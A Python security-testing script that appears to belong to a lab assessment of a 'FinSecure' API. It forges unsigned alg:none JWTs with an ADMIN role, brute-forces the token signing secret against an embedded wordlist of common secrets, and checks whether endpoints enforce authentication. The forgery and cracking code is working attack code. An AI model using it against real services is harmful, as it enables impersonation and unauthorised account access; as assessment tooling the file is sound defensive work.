#!/usr/bin/env python3
"""
auth_tester.py — JWT Authentication DAST Module
================================================
Tests the FinSecure API for authentication vulnerabilities:
  1. JWT alg:none bypass — forges a token with no signature
  2. JWT secret brute-force — tests wordlist against signed tokens
  3. Authorization enforcement — checks if protected endpoints reject missing tokens

Usage:
    python assessment/dast/auth_tester.py --target http://localhost:8080
    python assessment/dast/auth_tester.py --target http://localhost:8080 --wordlist rockyou-mini.txt
"""

import argparse
import base64
import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

FINDINGS_FILE = "findings/dast_results.json"
FINDINGS: list[dict] = []

# Common JWT secrets wordlist (embedded — no external file needed)
DEFAULT_WORDLIST = [
    "secret", "secret123", "password", "password123", "jwt_secret",
    "mySecret", "supersecret", "changeme", "12345678", "qwerty",
    "letmein", "admin", "finsecure", "app_secret", "jwttoken",
    "hs256", "secretkey", "apikey", "token123", "authsecret",
    "s3cr3t", "secure", "mysecretkey", "key", "signing_key",
]


# ─── Helpers ──────────────────────────────────────────────────────────────────

def b64_encode(data: dict | str) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":"))
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()


def forge_alg_none_token(username: str = "admin", role: str = "ADMIN") -> str:
    """Craft a JWT with alg:none — no signature required."""
    header  = b64_encode({"alg": "none", "typ": "JWT"})
    payload = b64_encode({
        "sub":    username,
        "role":   role,
        "userId": 1,
        "iat":    int(time.time()),
    })
    # Signature is empty for alg:none — just a trailing dot
    return f"{header}.{payload}."


def get_valid_token(target: str) -> tuple[str | None, str | None]:
    """Login with seed credentials and return a valid token."""
    try:
        resp = requests.post(
            f"{target}/api/auth/login",
            json={"username": "alice", "password": "alice123"},
            timeout=5,
        )
        if resp.status_code == 200:
            token = resp.json().get("token")
            return token, "alice"
    except requests.exceptions.ConnectionError:
        pass
    return None, None


def add_finding(title: str, severity: str, description: str, evidence: str) -> None:
    FINDINGS.append({
        "tool":        "auth_tester",
        "title":       title,
        "severity":    severity,
        "description": description,
        "evidence":    evidence,
        "timestamp":   datetime.utcnow().isoformat() + "Z",
    })


# ─── Test 1: JWT alg:none Bypass ──────────────────────────────────────────────

def test_jwt_alg_none(target: str) -> None:
    console.print(Panel("[bold cyan]TEST 1: JWT alg:none Bypass[/bold cyan]", border_style="cyan"))

    token = forge_alg_none_token(username="admin", role="ADMIN")
    console.print(f"[dim]Forged token:[/dim] [yellow]{token[:80]}...[/yellow]")

    try:
        # Test against a protected endpoint
        resp = requests.get(
            f"{target}/api/accounts",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )

        if resp.status_code == 200:
            data = resp.json()
            console.print(f"[bold red]✗ VULNERABLE — alg:none accepted! HTTP {resp.status_code}[/bold red]")
            console.print(f"[red]  Response contains {len(data) if isinstance(data, list) else 'data'}[/red]")
            add_finding(
                title="JWT Algorithm Confusion (alg:none Bypass)",
                severity="CRITICAL",
                description=(
                    "The server accepts JWT tokens with alg:none — tokens with no cryptographic "
                    "signature. An attacker can forge any identity by crafting a token with "
                    "arbitrary claims (role: ADMIN, sub: any-user) and no signature."
                ),
                evidence=f"Forged token accepted. HTTP 200 returned {len(str(data))} bytes of account data.",
            )
        elif resp.status_code == 401:
            console.print(f"[green]✓ SAFE — alg:none rejected (HTTP 401)[/green]")
        else:
            console.print(f"[yellow]? Unexpected response: HTTP {resp.status_code}[/yellow]")

        # Also test admin endpoint with forged ADMIN role
        resp2 = requests.get(
            f"{target}/api/accounts/admin/all",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        if resp2.status_code == 200:
            console.print(f"[bold red]✗ ADMIN ENDPOINT accessible with forged token! HTTP {resp2.status_code}[/bold red]")
        else:
            console.print(f"[dim]Admin endpoint: HTTP {resp2.status_code}[/dim]")

    except requests.exceptions.ConnectionError:
        console.print(f"[red]✗ Cannot connect to {target}. Is the API running?[/red]")
        console.print(f"[yellow]Run: java -jar target-app/target/finsecure-api-1.0.0.jar[/yellow]")


# ─── Test 2: JWT Secret Brute-Force ───────────────────────────────────────────

def test_jwt_bruteforce(target: str, wordlist: list[str]) -> None:
    console.print(Panel("[bold cyan]TEST 2: JWT Secret Brute-Force[/bold cyan]", border_style="cyan"))

    # First get a valid signed token to brute-force
    valid_token, _ = get_valid_token(target)
    if not valid_token:
        console.print("[yellow]Cannot get a signed token to brute-force (API not reachable). Using demo token.[/yellow]")
        # Use a demo token signed with 'secret123'
        valid_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJVU0VSIn0.iG_DEMO_NOT_REAL"

    console.print(f"[dim]Testing {len(wordlist)} candidate secrets...[/dim]")

    try:
        import hmac
        import hashlib

        # Decode token parts
        parts = valid_token.split(".")
        if len(parts) != 3:
            console.print("[red]Invalid token format[/red]")
            return

        header_payload = f"{parts[0]}.{parts[1]}"
        actual_sig = parts[2]

        found_secret = None
        for secret in wordlist:
            # HMAC-SHA256 signature
            sig = hmac.new(
                secret.encode(),
                header_payload.encode(),
                hashlib.sha256
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

            if sig_b64 == actual_sig:
                found_secret = secret
                break

        if found_secret:
            console.print(f"[bold red]✗ VULNERABLE — Secret found: '{found_secret}'[/bold red]")
            console.print(f"[red]  JWT signing secret is weak and in common wordlists![/red]")
            add_finding(
                title="Hardcoded Weak JWT Secret",
                severity="HIGH",
                description=(
                    f"The JWT signing secret '{found_secret}' was found via brute-force of a "
                    f"{len(wordlist)}-entry wordlist. Attacker can forge valid signed tokens "
                    "for any user without exploiting alg:none."
                ),
                evidence=f"Secret '{found_secret}' verified by reproducing token signature.",
            )
        else:
            console.print(f"[green]✓ Secret not found in {len(wordlist)}-entry wordlist[/green]")

    except ImportError:
        console.print("[yellow]hmac module unavailable[/yellow]")


# ─── Test 3: Authorization Enforcement ────────────────────────────────────────

def test_auth_enforcement(target: str) -> None:
    console.print(Panel("[bold cyan]TEST 3: Authorization Header Enforcement[/bold cyan]", border_style="cyan"))

    endpoints = [
        ("GET",  "/api/accounts",          "List all accounts"),
        ("GET",  "/api/accounts/1",         "View account by ID"),
        ("POST", "/api/accounts",           "Create account"),
        ("GET",  "/api/accounts/admin/all", "Admin endpoint"),
    ]

    table = Table(box=box.SIMPLE, header_style="bold")
    table.add_column("Method", width=8)
    table.add_column("Endpoint", width=35)
    table.add_column("No Token", width=12)
    table.add_column("Bad Token", width=12)
    table.add_column("Status", width=14)

    for method, endpoint, desc in endpoints:
        # Test 1: No Authorization header
        try:
            r_no_auth = requests.request(
                method, f"{target}{endpoint}",
                json={"ownerName": "Test"} if method == "POST" else None,
                timeout=5,
            )
            no_auth_code = r_no_auth.status_code
        except requests.exceptions.ConnectionError:
            no_auth_code = 0

        # Test 2: Invalid token
        try:
            r_bad = requests.request(
                method, f"{target}{endpoint}",
                headers={"Authorization": "Bearer INVALID.TOKEN.HERE"},
                json={"ownerName": "Test"} if method == "POST" else None,
                timeout=5,
            )
            bad_code = r_bad.status_code
        except requests.exceptions.ConnectionError:
            bad_code = 0

        # Determine status
        if no_auth_code in (401, 403) and bad_code in (401, 403):
            status = "[green]✓ Enforced[/green]"
        elif no_auth_code == 200 or bad_code == 200:
            status = "[bold red]✗ BYPASSED[/bold red]"
            add_finding(
                title=f"Missing Auth Check on {endpoint}",
                severity="HIGH",
                description=f"Endpoint {method} {endpoint} returns 200 without valid authentication.",
                evidence=f"No-auth: HTTP {no_auth_code}, Bad-token: HTTP {bad_code}",
            )
        else:
            status = f"[yellow]? ({no_auth_code}/{bad_code})[/yellow]"

        table.add_row(
            method,
            endpoint,
            f"HTTP {no_auth_code}" if no_auth_code else "[dim]N/A[/dim]",
            f"HTTP {bad_code}"     if bad_code     else "[dim]N/A[/dim]",
            status,
        )

    console.print(table)


# ─── Save & Main ──────────────────────────────────────────────────────────────

def save_findings() -> None:
    os.makedirs("findings", exist_ok=True)
    existing = []
    if Path(FINDINGS_FILE).exists():
        with open(FINDINGS_FILE) as f:
            existing = json.load(f).get("findings", [])

    all_findings = existing + FINDINGS
    with open(FINDINGS_FILE, "w") as f:
        json.dump({
            "last_updated": datetime.utcnow().isoformat() + "Z",
            "findings": all_findings,
        }, f, indent=2)
    console.print(f"\n[green]✓ Findings saved to[/green] [bold]{FINDINGS_FILE}[/bold]")


def main():
    parser = argparse.ArgumentParser(description="FinSecure JWT Auth Tester")
    parser.add_argument("--target",   default="http://localhost:8080", help="Base URL of FinSecure API")
    parser.add_argument("--wordlist", help="Path to JWT secret wordlist file")
    args = parser.parse_args()

    console.print(Panel(
        "[bold cyan]FinSecure API — Auth Vulnerability Tester[/bold cyan]\n"
        "[dim]JWT alg:none · Secret Brute-Force · Auth Enforcement[/dim]",
        border_style="cyan",
    ))
    console.print(f"[dim]Target:[/dim] [bold]{args.target}[/bold]\n")

    # Load wordlist
    wordlist = DEFAULT_WORDLIST
    if args.wordlist and Path(args.wordlist).exists():
        wordlist = Path(args.wordlist).read_text().splitlines()
        console.print(f"[dim]Loaded {len(wordlist)} words from {args.wordlist}[/dim]\n")

    test_jwt_alg_none(args.target)
    console.print()
    test_jwt_bruteforce(args.target, wordlist)
    console.print()
    test_auth_enforcement(args.target)

    save_findings()

    # Summary
    if FINDINGS:
        console.print(f"\n[bold red]⚠  {len(FINDINGS)} vulnerability/vulnerabilities found![/bold red]")
    else:
        console.print("\n[bold green]✓ No auth vulnerabilities detected.[/bold green]")


if __name__ == "__main__":
    main()
